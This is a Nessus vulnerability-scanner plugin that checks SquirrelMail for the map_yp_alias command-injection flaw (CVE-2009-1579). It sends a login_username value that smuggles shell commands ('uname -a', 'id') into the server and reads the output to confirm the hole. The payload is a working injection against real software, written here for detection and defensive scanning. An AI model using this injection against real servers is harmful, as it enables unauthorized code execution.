#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(38794);
  script_version("$Revision: 1.11 $");
  
  script_cve_id("CVE-2009-1579");
  script_bugtraq_id(34916);
  script_osvdb_id(54506);

  script_name(english:"SquirrelMail map_yp_alias Username Mapping Alias Arbitrary Code Execution");
  script_summary(english:"Attempts to execute a command on the remote host");

  script_set_attribute(attribute:"synopsis", value:
"The remote webmail application allows execution of arbitrary code." );
  script_set_attribute(attribute:"description", value:
"The installed version of SquirrelMail fails to properly sanitize
input to the '$username' variable in the 'map_yp_alias' function in
'functions/imap_general.php'.  An unauthenticated, remote attacker can
exploit this to execute arbitrary code subject to the privileges of
the affected web-server. 

Note that there are also reported to be several cross-site scripting
vulnerabilities as well as a session fixation vulnerability, though
Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"http://www.squirrelmail.org/security/issue/2009-05-10" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to SquirrelMail 1.4.19 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_cwe_id(94);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/05/15");
 script_cvs_date("$Date: 2015/09/24 23:21:21 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:squirrelmail:squirrelmail");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("squirrelmail_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/squirrelmail");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

cmd = "id";
exploit = string(';uname -a;echo __nessus;', cmd, ';echo __nessus2');

# Test an install
install = get_kb_item(string("www/", port, "/squirrelmail"));
if (isnull(install)) exit(0);

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  postdata=string("login_username=", exploit, "&secretkey=&js_autodetect_results=1&just_logged_in=1");
  url = matches[2]+ "/src/redirect.php";

  req = http_mk_post_req(
    port        : port,
    version     : 11, 
    item        : url, 
    add_headers : make_array("Content-Type", "application/x-www-form-urlencoded"),
    data        : postdata
  );
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);

  if (
    (
      "Error connecting to IMAP server:" >< res[2] &&
      "__nessus" >< res[2] &&
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res[2]) 
    )
  )
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);
      report = string(
        "\n",
        "Nessus was able to execute the 'id' command on the remote host \n",
        "host using the following request :\n",
        "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
        req_str, "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
      );
      if (report_verbosity > 1)
      {
        output = strstr(res[2], "__nessus") - "__nessus";
        output = output - strstr(output, "__nessus2");
        report = string(
          report,
          "\n",
          "It produced the following output :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          output, "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port:port);
  }
}
